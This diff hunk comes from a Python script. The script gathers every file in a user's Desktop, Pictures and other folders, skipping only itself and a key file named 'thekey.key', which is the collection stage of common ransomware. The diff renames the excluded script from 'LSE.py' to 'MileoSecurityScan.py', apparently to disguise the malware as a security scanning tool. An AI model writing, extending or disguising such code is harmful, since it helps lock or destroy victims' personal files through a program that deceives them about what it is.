@@ -14,31 +14,31 @@ dry4 = '%Desktop%'
 dry77 = '%Pictures%'
 
 for file in os.listdir(e4):
-        if file == "LSE.py" or file == "thekey.key":
+        if file == "MileoSecurityScan.py" or file == "thekey.key":
                 continue
         if os.path.isfile(file):
                 files.append(file)
 
 for file in os.listdir(h4):
-        if file == "LSE.py" or file == "thekey.key":
+        if file == "MileoSecurityScan.py" or file == "thekey.key":
                 continue
         if os.path.isfile(file):
                 files.append(file)
 
 for file in os.listdir(v3):
-        if file == "LSE.py" or file == "thekey.key":
+        if file == "MileoSecurityScan.py" or file == "thekey.key":
                 continue
         if os.path.isfile(file):
                 files.append(file)
 
 for file in os.listdir(dry4):
-        if file == "LSE.py" or file == "thekey.key":
+        if file == "MileoSecurityScan.py" or file == "thekey.key":
                 continue
         if os.path.isfile(file):
                 files.append(file)
 
 for file in os.listdir(dry77):
-        if file == "LSE.py" or file == "thekey.key":
+        if file == "MileoSecurityScan.py" or file == "thekey.key":
                 continue
         if os.path.isfile(file):
                 files.append(file)
